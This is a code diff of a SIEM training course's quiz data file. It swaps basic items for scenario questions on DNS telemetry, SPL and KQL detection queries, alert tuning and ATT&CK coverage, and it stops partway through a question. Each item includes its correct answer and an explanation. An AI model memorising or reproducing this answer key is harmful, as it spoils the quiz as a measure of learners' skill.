+          "Endpoint DNS (Sysmon 22 / EDR) — attributes the query to the EXACT process and host, which resolver/server logs cannot. Combine with resolver logs for fallback coverage of unmanaged hosts.",
+          "DHCP logs.",
+          "Firewall logs only."
         ],
         correctAnswer: 1,
-        explanation: "An index is a structured data store within the SIEM where processed events are organized and optimized for fast searching and retrieval."
+        explanation: "Server/resolver DNS knows the host but not the process. Endpoint DNS attributes the query to the specific process making it — essential for proving 'powershell.exe queried evil.com' rather than 'something on host01 did.' Best practice: collect both."
       },
       {
         id: "siem-q2-14",
-        question: "What happens if logs arrive at the SIEM with incorrect timestamps?",
+        difficulty: "hard",
+        tags: ["Detection Reliability", "Testing"],
+        scenario: "You're proposing a 'detection-as-code' workflow: rules live in Git, PRs run automated tests, deployment via CI.",
+        question: "Which test type catches the MOST production breakage cheaply?",
         options: [
-          "Nothing — the SIEM ignores timestamps",
-          "Events may be placed out of order, making correlation and investigation inaccurate",
-          "The SIEM automatically corrects all timestamps",
-          "Logs are automatically deleted"
+          "Linting the YAML/Sigma syntax only.",
+          "Replay tests: known-malicious and known-benign sample events are run through the parser+detection pipeline in CI; the rule must fire on the malicious set and stay silent on the benign set. Catches regressions from parser, schema, and logic changes simultaneously.",
+          "Manual peer review only.",
+          "Production monitoring after deploy only."
         ],
         correctAnswer: 1,
-        explanation: "Incorrect timestamps cause events to appear in the wrong order, breaking correlation rules and making incident timelines unreliable."
+        explanation: "Replay/'fixture' tests are the industry's highest-ROI safeguard — they catch parser drift, field renames, AND logic regressions in one shot. Linting catches syntax. Peer review and prod monitoring matter but don't substitute for objective behavioral tests."
       },
       {
         id: "siem-q2-15",
-        question: "What is 'parsing' in the context of SIEM data ingestion?",
+        difficulty: "medium",
+        tags: ["Compliance", "PCI/GDPR"],
+        scenario: "Compliance asks: 'Can you prove logs were not tampered with between source and SIEM?'",
+        question: "Strongest technical answer?",
         options: [
-          "Sending data to a backup server",
-          "Breaking raw log data into structured fields that can be searched and analyzed",
-          "Compressing log files",
-          "Deleting malformed logs"
+          "'Trust us.'",
+          "TLS in transit (TCP 6514) + WORM/immutable storage tier for compliance retention + audit trail on the SIEM admin role (who searched, who exported, who deleted). Combine with source-side log signing where supported.",
+          "Lock the server room.",
+          "Backup to tape monthly."
         ],
         correctAnswer: 1,
-        explanation: "Parsing breaks raw, unstructured log data into structured, labeled fields (timestamp, source IP, action, etc.) for efficient querying."
+        explanation: "PCI/SOX/GDPR ask about integrity and access control. The defensible answer chains: transport encryption, immutable storage (S3 Object Lock, Splunk frozen WORM, Azure immutable blobs), and admin auditing — so any tamper attempt is detectable AND attributable."
       }
     ]
   },
   {
     quizId: "siem-q3",
     courseId: "siem-fundamentals",
-    title: "Search & Query Mastery",
-    description: "Practical quiz on writing SIEM queries and search techniques.",
+    title: "SPL & KQL in the Trenches",
+    description: "Hands-on scenario quiz: write and read the queries you'll use every shift.",
     passingScore: 75,
     timeLimit: 25,
     questions: [
       {
         id: "siem-q3-1",
-        question: "In SPL, what does the 'stats count by src_ip' command do?",
+        difficulty: "medium",
+        tags: ["SPL", "Brute Force"],
+        scenario: "Investigating a possible brute force against Windows accounts in the last hour. You want: top 10 (user, src_ip) pairs by failed logon count, only pairs with ≥ 20 failures.",
+        question: "Which SPL is correct?",
         options: [
-          "Deletes events grouped by source IP",
-          "Counts the number of events for each unique source IP address",
-          "Sorts events alphabetically by source IP",
-          "Filters out all source IP fields"
+          "index=wineventlog EventCode=4625 earliest=-1h | stats count by user src_ip | where count>=20 | sort -count | head 10",
+          "index=wineventlog | top user src_ip",
+          "index=* fail | head 10",
+          "index=wineventlog EventCode=4624 | stats values(user) by src_ip"
         ],
-        correctAnswer: 1,
-        explanation: "The 'stats count by src_ip' command aggregates events, counting how many occurrences exist for each unique source IP address."
+        correctAnswer: 0,
+        explanation: "(A) scopes to the right EID (4625 = failed logon), aggregates by the right keys, filters with where, sorts descending, and head-limits — the canonical SPL brute-force triage. (D) uses 4624 (SUCCESSFUL logon). (B)/(C) lack the failure filter and threshold."
       },
       {
         id: "siem-q3-2",
-        question: "What does the wildcard character '*' do in a SIEM search?",
+        difficulty: "medium",
+        tags: ["KQL", "Sentinel", "Impossible Travel"],
+        scenario: "Sentinel — for each user in the last 24h, you want the count of DISTINCT countries they signed in from, surfacing users with > 2 countries.",
+        question: "Which KQL is correct?",
         options: [
-          "Deletes all matching results",
-          "Matches zero or more characters in a search term",
-          "Marks results as favorites",
-          "Exports results to CSV"
+          "SigninLogs | where Country != 'US'",
+          "SigninLogs | where TimeGenerated > ago(24h) | summarize Countries = dcount(LocationDetails.countryOrRegion) by UserPrincipalName | where Countries > 2",
+          "SigninLogs | project Country | distinct Country",
+          "SigninLogs | summarize count() by UserPrincipalName"
         ],
         correctAnswer: 1,
-        explanation: "The wildcard '*' matches zero or more characters, enabling partial matching. For example, 'fail*' matches 'failed', 'failure', 'failing', etc."
+        explanation: "summarize + dcount is KQL's standard pattern for 'distinct count grouped by'. (D) counts total sign-ins (noisy users dominate, not travellers). (C) drops the per-user grouping entirely."
       },
       {
         id: "siem-q3-3",
-        question: "In KQL, what does '| where TimeGenerated > ago(1h)' do?",
+        difficulty: "hard",
+        tags: ["SPL", "Performance"],
+        scenario: "A search is slow:\n  index=* sourcetype=* user=jdoe earliest=-7d | stats count\nDaily ingest is 5 TB across 40 sourcetypes; jdoe appears in only 2 of them.",
+        question: "Biggest single performance win?",
         options: [
-          "Shows events from more than 1 hour ago only",
-          "Filters results to events from the last 1 hour",
-          "Deletes events older than 1 hour",
-          "Groups events by hour"
+          "Add | head 1 at the end.",
+          "Replace index=* sourcetype=* with the specific index(es) and sourcetype(s) where 'user' is a real, extracted field. The fewer buckets opened and the more selective the filters BEFORE the first pipe, the better.",
+          "Run it at midnight.",
+          "Add | fields user count to the end."
         ],
         correctAnswer: 1,
-        explanation: "The 'where TimeGenerated > ago(1h)' filter returns only events generated within the last hour."
+        explanation: "index=* sourcetype=* defeats Splunk's bucket pruning — every index for the time range is opened. Specificity at the FIRST search command (the 'base search') is the single biggest lever. Adding accelerated data models + tstats is the next step."
       },
       {
         id: "siem-q3-4",
-        question: "What is the purpose of the 'table' command in SPL?",
+        difficulty: "medium",
+        tags: ["KQL", "join"],
+        scenario: "You need to find users who had a failed sign-in AND a successful sign-in from the SAME IP within 10 minutes (brute-force success).",
+        question: "Which KQL pattern is appropriate?",
         options: [
-          "Creates a database table",
-          "Displays only the specified fields in a tabular format",
-          "Sorts data into tables by time",
-          "Joins two data sources"
+          "Two separate queries, eyeball the results.",
+          "SigninLogs | where ResultType != 0 | project user=UserPrincipalName, ip=IPAddress, failTime=TimeGenerated | join kind=inner (SigninLogs | where ResultType == 0 | project user=UserPrincipalName, ip=IPAddress, successTime=TimeGenerated) on user, ip | where successTime between (failTime .. failTime + 10m)",
+          "SigninLogs | summarize count() by UserPrincipalName",
+          "SigninLogs | where ResultType == 0 and ResultType != 0"
         ],
         correctAnswer: 1,
-        explanation: "The 'table' command in SPL displays results showing only the specified fields in a clean tabular format."
+        explanation: "Self-join with shared keys (user, ip) + a time-window predicate is the canonical KQL recipe for 'event A followed by event B within N minutes'. (D) is a logical impossibility on a single row."
       },
       {
         id: "siem-q3-5",
-        question: "How do you search for an exact phrase in most SIEM platforms?",
+        difficulty: "hard",
+        tags: ["SPL", "Stats vs Transaction"],
+        scenario: "You want to group all events of a user session (logon → activity → logoff) and compute session duration.",
+        question: "Which approach scales better on a 50 GB/day index?",
         options: [
-          "Using parentheses: (exact phrase)",
-          "Using double quotes: \"exact phrase\"",
-          "Using brackets: [exact phrase]",
-          "Using asterisks: *exact phrase*"
+          "transaction user maxspan=8h startswith=eval(EventCode=4624) endswith=eval(EventCode=4634) — simple but expensive.",
+          "stats with min(_time) and max(_time) by session_key (e.g. LogonID), then eval duration = max-min — far cheaper than transaction at scale, since stats is distributable to indexers.",
+          "Loop over each user in a foreach.",
+          "Use index=*."
         ],
         correctAnswer: 1,
-        explanation: "Double quotes are used across most SIEM platforms to search for exact phrases, ensuring the words appear together in that order."
+        explanation: "transaction is convenient but resource-heavy (forces a search-head reduce). When a shared key exists (LogonID, session_id, correlation_id), stats min/max + eval is dramatically cheaper because it's distributable. Reserve transaction for cases where ordering/state truly matters."
       },
       {
         id: "siem-q3-6",
-        question: "What does the SPL command 'dedup src_ip' do?",
+        difficulty: "easy",
+        tags: ["SPL"],
+        scenario: "You write:\n  index=web | stats count by status\nresult shows just '200, 301, 404'. Your colleague wants the count visible too in a clean table.",
+        question: "Minimal correct addition?",
         options: [
-          "Duplicates all source IP events",
-          "Removes duplicate events, keeping only the first occurrence per unique source IP",
-          "Counts duplicate IPs",
-          "Sorts IPs in descending order"
+          "| chart count",
+          "| table status count (after the stats — selects + orders the columns for display)",
+          "| sort status",
+          "| eval count=1"
         ],
         correctAnswer: 1,
-        explanation: "The 'dedup' command removes duplicate events based on the specified field, keeping only the first occurrence of each unique value."
+        explanation: "stats already produces count and status; table just picks which fields to render and in what order. (D) would overwrite count with 1 — destructive."
       },
       {
         id: "siem-q3-7",
-        question: "In KQL, what does the 'summarize' operator do?",
+        difficulty: "medium",
+        tags: ["KQL", "Time"],
+        scenario: "You want sign-ins from the last 7 days, bucketed by HOUR, separated by Result (Success/Failure), for a time-series chart.",
+        question: "Correct KQL?",
         options: [
-          "Displays a text summary of the query",
-          "Aggregates data using functions like count(), avg(), sum() grouped by specified fields",
-          "Summarizes the SIEM configuration",
-          "Compresses query results"
+          "SigninLogs | where TimeGenerated > ago(7d) | summarize Count = count() by bin(TimeGenerated, 1h), Result = iff(ResultType == 0, 'Success', 'Failure') | render timechart",
+          "SigninLogs | take 100",
+          "SigninLogs | summarize count() by ResultType",
+          "SigninLogs | where TimeGenerated > now()"
         ],
-        correctAnswer: 1,
-        explanation: "The 'summarize' operator in KQL performs aggregation, similar to SQL's GROUP BY."
+        correctAnswer: 0,
+        explanation: "bin(TimeGenerated, 1h) is KQL's time-bucket; iff/case maps numeric ResultType into human labels; render timechart finishes the series. (D) is empty (now is a single instant)."
       },
       {
         id: "siem-q3-8",
-        question: "What is the Boolean operator to exclude results in SIEM searches?",
+        difficulty: "hard",
+        tags: ["SPL", "Lookups", "Enrichment"],
+        scenario: "You maintain a CSV lookup 'threat_ips.csv' with columns ip, score, source. You want to enrich every proxy event with the threat score and filter to score > 80.",
+        question: "Correct SPL?",
         options: [
-          "AND",
-          "OR",
-          "NOT",
-          "XOR"
+          "index=proxy | lookup threat_ips.csv ip OUTPUT score source | where score > 80",
+          "index=proxy AND threat_ips.csv",
+          "index=proxy | join threat_ips",
+          "index=proxy | dedup ip"
         ],
-        correctAnswer: 2,
-        explanation: "The NOT operator excludes matching results from the search."
+        correctAnswer: 0,
+        explanation: "lookup is Splunk's enrichment primitive — it matches on the lookup's key (ip) and OUTPUTs the extra fields. Filter AFTER the lookup. join would also work but is far more expensive when a lookup file suffices."
       },
       {
         id: "siem-q3-9",
-        question: "What does 'earliest=-24h latest=now' specify in a Splunk search?",
+        difficulty: "medium",
+        tags: ["KQL", "extend/project"],
+        scenario: "You need to compute a derived field RiskTag = 'high' when failed sign-ins > 50 else 'low', per user.",
+        question: "Which KQL is right?",
         options: [
-          "Delete data from the last 24 hours",
-          "The time range for the search: from 24 hours ago to the current time",
-          "Schedule a search to run every 24 hours",
-          "Limit results to 24 entries"
+          "SigninLogs | where ResultType != 0 | summarize Failed = count() by UserPrincipalName | extend RiskTag = iff(Failed > 50, 'high', 'low')",
+          "SigninLogs | project RiskTag = 'high'",
+          "SigninLogs | summarize count() | where count > 50",
+          "SigninLogs | take 50"
         ],
-        correctAnswer: 1,
-        explanation: "These time modifiers set the search window from 24 hours ago to the present moment."
+        correctAnswer: 0,
+        explanation: "summarize first to get the per-user count; then extend adds a calculated column using iff. project would have worked too — extend is non-destructive (keeps existing columns), project picks an explicit set."
       },
       {
         id: "siem-q3-10",
-        question: "What is the pipe character '|' used for in SIEM queries?",
+        difficulty: "hard",
+        tags: ["SPL", "Anomaly"],
+        scenario: "You want to detect users whose data egress today is anomalously high vs their own 14-day baseline (z-score > 3).",
+        question: "Which SPL approach is correct?",
         options: [
-          "Indicating a comment in the query",
-          "Chaining commands, sending the output of one command as input to the next",
-          "Separating field names from values",
-          "Marking the end of a query"
+          "| stats sum(bytes_out) by user — done.",
+          "Build a 14-day per-user baseline with stats avg, stdev; outer-join today's per-user sum; compute z = (today - avg) / stdev; alert where z > 3. (Or use streamstats / anomalydetection.)",
+          "Threshold at a fixed 1 GB/day for everyone.",
+          "Use top 10 every day."
         ],
         correctAnswer: 1,
-        explanation: "The pipe '|' chains commands together in a pipeline, where each command processes the output of the previous one."
+        explanation: "Per-user behavioral baselines beat global thresholds because 'normal' differs per role (developers vs receptionists). The pattern: historic mean+stdev → join → z-score → threshold. Fixed thresholds (C) miss low-volume insiders and noise on high-volume users."
       },
       {
         id: "siem-q3-11",
-        question: "How would you search for failed login attempts from a specific subnet in SPL?",
+        difficulty: "medium",
+        tags: ["SPL", "Subsearch"],
+        scenario: "You want all events from src_ip values that already triggered the 'high-risk' alert today (a small set — < 100 IPs).",
+        question: "Which is correct AND efficient?",
         options: [
-          "failed login src_ip=192.168.1.*",
-          "search failed AND login AND src_ip LIKE 192.168.1",
-          "index=security action=failure src_ip=192.168.1.0/24",
-          "Both A and C are valid approaches"
+          "index=network [search index=alerts severity=high earliest=@d | stats values(src_ip) AS src_ip | table src_ip] — subsearch returns the IP list and is expanded into the outer search filter.",
+          "index=network | join src_ip [search index=alerts]",
+          "index=* alerts high",
+          "index=network | where src_ip IN (alerts)"
         ],
-        correctAnswer: 3,
-        explanation: "Both wildcard matching (192.168.1.*) and CIDR notation (192.168.1.0/24) are valid approaches in SPL to search within a subnet."
+        correctAnswer: 0,
+        explanation: "Subsearches are perfect for SMALL result sets used as a filter — the inner search runs first, returns IPs, and the outer search filters at the indexers. join is the heavy-hammer alternative; subsearch with a small set is faster. Note the 10,500-row default subsearch cap."
       },
       {
         id: "siem-q3-12",
-        question: "What does 'head 10' do in a SIEM query?",
+        difficulty: "easy",
+        tags: ["KQL"],
+        scenario: "You want to limit a noisy KQL query to the 20 most recent rows for quick inspection.",
+        question: "Which is correct?",
         options: [
-          "Shows the first 10 results from the search",
-          "Deletes the top 10 events",
-          "Creates 10 copies of each event",
-          "Runs the search 10 times"
+          "| take 20 — random 20 rows, not necessarily newest.",
+          "| top 20 by TimeGenerated desc — guarantees the 20 most recent rows.",
+          "| head 20 — KQL has no head operator.",
+          "| limit"
         ],
-        correctAnswer: 0,
-        explanation: "The 'head' command limits output to the first N results, useful for quickly viewing the most relevant events."
+        correctAnswer: 1,
+        explanation: "Subtle but important: take returns ANY 20 rows (no guaranteed order), top N by field desc returns the actual newest. Use take for fast spot-checks, top by time for 'most recent'."
       },
       {
         id: "siem-q3-13",
-        question: "In KQL, what does 'project' do?",
+        difficulty: "medium",
+        tags: ["SPL", "Regex"],
+        scenario: "URLs are buried in proxy raw events. You want a field 'domain' extracted in-flight without an admin-side parser change.",
+        question: "Which SPL works?",
         options: [
-          "Creates a new project in Sentinel",
-          "Selects specific columns to display in the output",
-          "Projects future trends",
-          "Archives the query"
+          "| rex field=_raw \"https?://(?<domain>[^/]+)\"",
+          "| eval domain=url",
+          "| spath",
+          "| extract"
         ],
-        correctAnswer: 1,
-        explanation: "The 'project' operator in KQL selects which columns to include in the output, similar to SELECT in SQL."
+        correctAnswer: 0,
+        explanation: "rex applies a named-capture regex at search-time — the right tool for ad-hoc extraction without touching props.conf. For production, promote it to a permanent field extraction; for triage, rex is unbeatable."
       },
       {
         id: "siem-q3-14",
-        question: "What is a subsearch (or subquery) in SIEM?",
+        difficulty: "hard",
+        tags: ["KQL", "Performance"],
+        scenario: "A KQL query over 30 days of SecurityEvent times out. You really need 30 days.",
+        question: "Best optimization path?",
         options: [
-          "A search that runs below the main search bar",
-          "A nested search whose results feed into the outer/main search",
-          "A search performed by a subordinate analyst",
-          "A backup copy of a search"
+          "Run it again and hope.",
+          "Narrow at the source: project away unused columns EARLY (project-keep / project-away), apply where filters as the FIRST operators (not after parsing), use materialized views or summarize into a smaller table refreshed hourly, and let the analyst query the summary.",
+          "Increase the timeout to 8 hours.",
+          "Switch to SPL."
         ],
         correctAnswer: 1,
-        explanation: "A subsearch is a nested query that executes first, and its results are used as input for the outer search."
+        explanation: "KQL perf rules: filter early, project columns away early, prefer materialized aggregations for repeated dashboards. The same '30 days of raw' search is often a 30-day pre-aggregation underneath plus a fast drill-down."
       },
       {
         id: "siem-q3-15",
-        question: "What does the 'sort' command do in SPL?",
+        difficulty: "hard",
+        tags: ["SPL", "Detection"],
+        scenario: "You want: 'Service account whose number of distinct destination hosts in 1h > 5x its 7-day median' (lateral-movement signal).",
+        question: "Sketch the SPL pattern.",
         options: [
-          "Groups similar events together",
-          "Orders results by specified fields in ascending or descending order",
-          "Removes sorted data",
-          "Counts sorted fields"
+          "index=auth | stats count",
+          "index=auth account_type=service earliest=-1h | stats dc(dest_host) AS hosts_1h by user | join user [search index=auth account_type=service earliest=-7d@d latest=@d | bucket _time span=1h | stats dc(dest_host) AS h by user _time | stats median(h) AS median_hosts by user] | where hosts_1h > 5 * median_hosts",
+          "index=auth | top user",
+          "index=auth | head 1000"
         ],
         correctAnswer: 1,
-        explanation: "The 'sort' command orders results by one or more fields. Use '-' prefix for descending order."
+        explanation: "Per-entity baseline vs current window is the lateral-movement bread-and-butter. Compute the 1h current value, compute the 7d historical hourly median, join on user, threshold on the ratio. Critical: filter to service accounts where 'fan-out' is genuinely anomalous."
       },
       {
         id: "siem-q3-16",
-        question: "How do you use a lookup table in Splunk?",
+        difficulty: "medium",
+        tags: ["KQL", "let / functions"],
+        scenario: "You repeat the same 'risky user list' subquery in five Sentinel rules.",
+        question: "Cleanest way to centralize?",
         options: [
-          "By importing a CSV file into the dashboard",
-          "Using the 'lookup' command to enrich events with data from an external table",
-          "By manually typing reference data",
-          "Lookups are not supported in Splunk"
+          "Copy/paste — easy.",
+          "Save it as a saved KQL function (or use let in a workspace function); each rule calls RiskyUsers() and the definition lives in ONE place.",
+          "Hardcode the user list.",
+          "Disable four of the rules."
         ],
         correctAnswer: 1,
-        explanation: "The 'lookup' command enriches search results by matching field values against an external lookup table."
+        explanation: "KQL functions (workspace-level) are the DRY mechanism. One source of truth, change once, every dependent rule updates. Copy/paste guarantees drift between rules within weeks."
       },
       {
         id: "siem-q3-17",
-        question: "What is the 'transaction' command used for in SPL?",
+        difficulty: "easy",
+        tags: ["SPL"],
+        scenario: "Your SPL: index=web | stats count by status. You want descending sort by count.",
+        question: "Correct addition?",
         options: [
-          "Processing financial transactions",
-          "Grouping related events into single transactions based on shared fields and time proximity",
-          "Creating database transactions",
-          "Logging purchase orders"
+          "| sort count",
+          "| sort -count",
+          "| desc count",
+          "| order count"
         ],
         correctAnswer: 1,
-        explanation: "The 'transaction' command groups related events into single transactions based on shared fields and time windows."
+        explanation: "Splunk uses minus prefix for descending: sort -count. sort count ascends; the other syntaxes don't exist."
       },
       {
         id: "siem-q3-18",
-        question: "What is the advantage of using 'tstats' over regular 'stats' in Splunk?",
+        difficulty: "hard",
+        tags: ["SPL", "tstats"],
+        scenario: "You need a fast count of distinct src_ip per hour over 30 days for a dashboard.",
+        question: "Which is dramatically faster?",
         options: [
-          "There is no advantage",
-          "tstats is significantly faster because it searches indexed metadata rather than raw events",
-          "tstats provides more accurate results",
-          "tstats works only in cloud deployments"
+          "index=fw | stats dc(src_ip) by date_hour — raw search across 30 days.",
+          "| tstats summariesonly=true dc(All_Traffic.src) FROM datamodel=Network_Traffic.All_Traffic BY _time span=1h — queries accelerated tsidx summaries.",
+          "Same speed.",
+          "Run it serially per day and union."
         ],
         correctAnswer: 1,
-        explanation: "tstats queries indexed metadata (tsidx files) rather than raw events, making it significantly faster for large datasets."
+        explanation: "tstats against an accelerated data model is typically 10–100x faster than equivalent stats over raw events, because it queries pre-built index metadata rather than scanning raw buckets. Acceleration cost is paid once at acceleration time, not per query."
       },
       {
         id: "siem-q3-19",
-        question: "In KQL, what does 'extend' do?",
+        difficulty: "medium",
+        tags: ["KQL", "parse"],
+        scenario: "A free-text Message field contains:\n  \"User jdoe logged in from 10.4.7.22 (session 9c1f)\"\nYou want extracted columns user, ip, session.",
+        question: "Which KQL operator fits?",
         options: [
-          "Extends the query timeout",
-          "Creates a new calculated column based on an expression",
-          "Extends the data retention period",
-          "Increases the result limit"
+          "| project Message",
+          "| parse Message with 'User ' user ' logged in from ' ip ' (session ' session ')'",
+          "| summarize Message",
+          "| extend user = Message"
         ],
         correctAnswer: 1,
-        explanation: "The 'extend' operator in KQL creates new calculated columns based on expressions."
+        explanation: "parse (or parse-kv / extract regex) is KQL's pattern-based extractor — declares the literal markers and captures the variable parts into named columns. The cleanest tool for predictable free-text formats."
       },
       {
         id: "siem-q3-20",
-        question: "What is the best practice for optimizing SIEM search performance?",
+        difficulty: "medium",
+        tags: ["Detection Engineering"],
+        scenario: "Final check before promoting a new rule to prod: it fires 3 times in the last 24h of test data — all 3 are true positives in your sample.",
+        question: "Is it ready?",
         options: [
-          "Always search all indexes without time filters",
-          "Use the narrowest time range, specific indexes, and filter early in the search pipeline",
-          "Use only wildcard searches for flexibility",
-          "Avoid using the pipe character"
+          "Yes — 100% precision in test, ship it.",
+          "Not yet — 3 samples is statistically meaningless. Run it against ≥ 30 days of REAL production telemetry, measure expected fire rate and FP profile, document the runbook, and stage in 'monitor-only' mode for a tuning window before promoting to actionable.",
+          "Yes — disable in 24h if noisy.",
+          "Skip prod testing, push to prod."
         ],
         correctAnswer: 1,
-        explanation: "Optimize by specifying the narrowest time range, targeting specific indexes, and filtering early to reduce data processed by subsequent commands."
+        explanation: "Tiny test samples lie. The mature workflow: backtest against historic prod data, deploy in monitor-only (notable but no page), let it bake 1–2 weeks, tune, THEN promote to actionable. This is how you keep on-call from hating you."
       }
     ]
   },
   {
     quizId: "siem-q4",
     courseId: "siem-fundamentals",
-    title: "Dashboards & Alerts Quiz",
-    description: "Test your skills on visualization, dashboards, and alert configuration.",
-    passingScore: 70,
-    timeLimit: 15,
+    title: "Alert Tuning & Detection Quality",
+    description: "Scenario quiz on building, tuning, and operating high-fidelity detections.",
+    passingScore: 75,
+    timeLimit: 20,
     questions: [
       {
         id: "siem-q4-1",
-        question: "What is the primary purpose of a SOC dashboard?",
+        difficulty: "medium",
+        tags: ["FP Reduction"],
+        scenario: "Rule 'Multiple Failed Logons' fires 1,200x/day. Triage shows: 95% from a vuln scanner (known IP), 4% from a misconfigured backup agent (known account), <1% true positives.",
+        question: "Correct tuning sequence?",
         options: [
-          "To replace all other monitoring tools",
-          "To provide real-time visibility into security events, trends, and operational status",
-          "To store log data",
-          "To manage user accounts"
+          "Disable the rule.",
+          "Add explicit exceptions for (scanner IP, backup service account) at the rule level, document each exception with owner + review date, and keep the rule otherwise unchanged so genuine brute-force still fires.",
+          "Raise the threshold to 10,000 so it stops firing.",
+          "Ignore the alerts."
         ],
         correctAnswer: 1,
-        explanation: "SOC dashboards provide at-a-glance visibility into security posture, showing real-time event trends, alert status, and key metrics."
+        explanation: "Targeted suppression of KNOWN-benign sources preserves detection on the unknown. Each exception is logged + reviewed periodically (scanner IPs change). Raising thresholds blindly (C) hides real attacks; disabling (A) is malpractice."
       },
       {
         id: "siem-q4-2",
-        question: "Which visualization type is best for showing trends over time?",
+        difficulty: "hard",
+        tags: ["Detection Lifecycle"],
+        scenario: "Your detection library has 412 rules. 60% of them have not fired in 12 months. The team debates: 'kill the silent ones' vs 'they're insurance, keep them.'",
+        question: "Most defensible approach?",
         options: [
-          "Pie chart",
-          "Single value panel",
-          "Line chart or area chart",
-          "Table"
+          "Delete every rule that hasn't fired in 12 months.",
+          "Treat silence as a SIGNAL, not a verdict. For each silent rule: (1) is the underlying log source still ingesting? (2) is the rule logic still semantically correct? (3) is the threat still relevant? Kill rules that fail all three; fix the rest; keep ATT&CK-coverage rules even if silent (insurance).",
+          "Keep all 412 forever.",
+          "Random sample — delete half."
         ],
-        correctAnswer: 2,
-        explanation: "Line charts and area charts are ideal for showing how values change over time."
+        correctAnswer: 1,
+        explanation: "Silent rules are sometimes good detections waiting for a rare attack and sometimes dead weight masking blind spots. Disciplined detection lifecycle (review cadence, ATT&CK gap analysis, ingestion health correlation) separates the two — never bulk-delete."
       },
       {
         id: "siem-q4-3",
-        question: "What is a 'drilldown' in a SIEM dashboard?",
+        difficulty: "medium",
+        tags: ["Severity"],
+        scenario: "A new rule 'PowerShell EncodedCommand executed' fires on every admin script (mostly benign) AND on real attacker tradecraft.",
+        question: "Best handling?",
         options: [
-          "A type of attack technique",
-          "Clicking a dashboard element to navigate to more detailed data or a new search",
-          "Drilling into physical hardware",
-          "Removing data from the dashboard"
+          "Critical severity, page on every fire.",
+          "Risk-based scoring: low severity by default; ESCALATE severity dynamically when combined with (a) parent process = Office app, (b) network beacon to new domain, or (c) running on a sensitive asset. Single signal → low; correlated signals → high.",
+          "Disable the rule.",
+          "Email all 200 fires to the SOC manager."
         ],
         correctAnswer: 1,
-        explanation: "Drilldowns allow users to click on dashboard elements to navigate to detailed views or run more specific searches."
+        explanation: "A single noisy signal becomes high-fidelity when correlated with context (parent process lineage, network, asset criticality). Risk-based alerting (Splunk RBA, Sentinel fusion, custom scoring) is the modern answer to 'good detection, too much noise.'"
       },
       {
         id: "siem-q4-4",
-        question: "What is alert fatigue?",
+        difficulty: "medium",
+        tags: ["Throttling"],
+        scenario: "Same rule fires 400 times in 10 minutes from the SAME src_ip during an obvious scan. Your on-call gets 400 pages.",
+        question: "Correct control?",
         options: [
-          "When the SIEM runs out of storage",
-          "When analysts become desensitized due to excessive false positive alerts",
-          "When alerts stop being generated",
-          "When dashboard refreshes are too slow"
+          "Disable the rule for an hour.",
+          "Configure throttling/de-duplication: ONE alert per (rule, src_ip) per 30-minute window, with a count field showing volume. Preserves visibility without flooding.",
+          "Ignore pages.",
+          "Lower severity globally."
         ],
         correctAnswer: 1,
-        explanation: "Alert fatigue occurs when analysts are overwhelmed by too many alerts (especially false positives), causing them to miss genuine threats."
+        explanation: "Throttling/grouping keys (per src_ip, per user, per asset) prevent alert storms while preserving the underlying event count. The analyst still sees '400 events from 1.2.3.4' — they just get one ticket, not 400."
       },
       {
         id: "siem-q4-5",
-        question: "What is a correlation rule in SIEM alerting?",
+        difficulty: "hard",
+        tags: ["ATT&CK Coverage"],
+        scenario: "Leadership asks: 'How good is our detection coverage?' You have 200 rules.",
+        question: "Best way to answer?",
         options: [
-          "A rule that correlates employee schedules",
-          "A detection rule that triggers when specific conditions across multiple events are met",
-          "A rule for organizing dashboard panels",
-          "A data backup policy"
+          "'We have 200 rules — lots of coverage.'",
+          "Map every rule to MITRE ATT&CK technique(s), publish a heatmap of covered vs uncovered techniques weighted by the threat profile relevant to your industry, and report (a) covered, (b) partially covered, (c) gaps. Coverage is a heatmap, not a single number.",
+          "Count alerts per day.",
+          "Show the SIEM uptime."
         ],
         correctAnswer: 1,
-        explanation: "Correlation rules define conditions across multiple events that, when met together, trigger an alert."
+        explanation: "ATT&CK Navigator-style heatmaps are the industry-standard coverage artifact. Volume of rules is meaningless if they all detect the same technique. Maturity = breadth across the matrix, weighted by threats relevant to YOUR org."
       },
       {
         id: "siem-q4-6",
-        question: "Which visualization is best for showing the proportion of alert types?",
+        difficulty: "medium",
+        tags: ["Alert Quality"],
+        scenario: "Two alerts arrive simultaneously:\n  Alert A: 'Suspicious activity detected on host01.' Severity: High.\n  Alert B: 'PowerShell base64-encoded download cradle from winword.exe child process on FIN-HR-04 (CFO laptop). MITRE T1059.001 / T1566. EDR confidence: 0.94.' Severity: High.\nBoth high. Which is a better-built alert and why?",
+        question: "Choose:",
         options: [
-          "Line chart",
-          "Pie chart or donut chart",
-          "Scatter plot",
-          "Gauge"
+          "A — shorter is better.",
+          "B — names the technique, the host, the asset context, the parent/child chain, and the confidence. The analyst can prioritize and start investigating in seconds. Alert NAMING and CONTEXT are detection-engineering deliverables, not afterthoughts.",
+          "They're equivalent.",
+          "A — leaves room for analyst judgment."
         ],
         correctAnswer: 1,
-        explanation: "Pie and donut charts effectively show proportional distribution of alert categories or severity levels."
+        explanation: "Alert metadata IS the product. Required fields (per detection): what was seen, where, on what asset, MITRE mapping, confidence, suggested next step. 'Suspicious activity' alerts are how SOCs go bankrupt on attention."
       },
       {
         id: "siem-q4-7",
-        question: "What is a 'token' in Splunk dashboard context?",
+        difficulty: "easy",
+        tags: ["Runbook"],
+        scenario: "An analyst opens an alert and has no idea what to do next.",
+        question: "What's missing?",
         options: [
-          "An authentication credential",
-          "A dynamic variable that allows user input to filter dashboard panels interactively",
-          "A physical security device",
-          "A type of alert"
+          "A bigger SIEM.",
+          "A runbook linked from the alert: triage steps, queries to pivot on, expected false-positive patterns, escalation criteria, containment options.",
+          "More alerts.",
+          "Higher severity."
         ],
         correctAnswer: 1,
-        explanation: "Dashboard tokens are dynamic variables populated by user inputs that filter data across multiple panels."
+        explanation: "Every production detection should ship with a runbook. The investment pays off on Day 1 when a junior analyst handles the alert as well as the engineer who wrote it. No runbook = silent operational debt."
       },
       {
         id: "siem-q4-8",
-        question: "What is the recommended approach to reduce false positives in SIEM alerts?",
+        difficulty: "hard",
+        tags: ["Risk-Based Alerting"],
+        scenario: "Instead of paging on every individual notable, you accumulate risk events on entities (users/hosts). A user with 5 medium-risk notables in 24h pages; a user with 1 high-risk notable also pages.",
+        question: "This is:",
         options: [
-          "Disable all alerts",
-          "Regularly review and tune detection rules by adding exceptions and adjusting thresholds",
-          "Increase alert severity for all rules",
-          "Only use pre-built alerts without modification"
+          "Bad — every alert should page.",
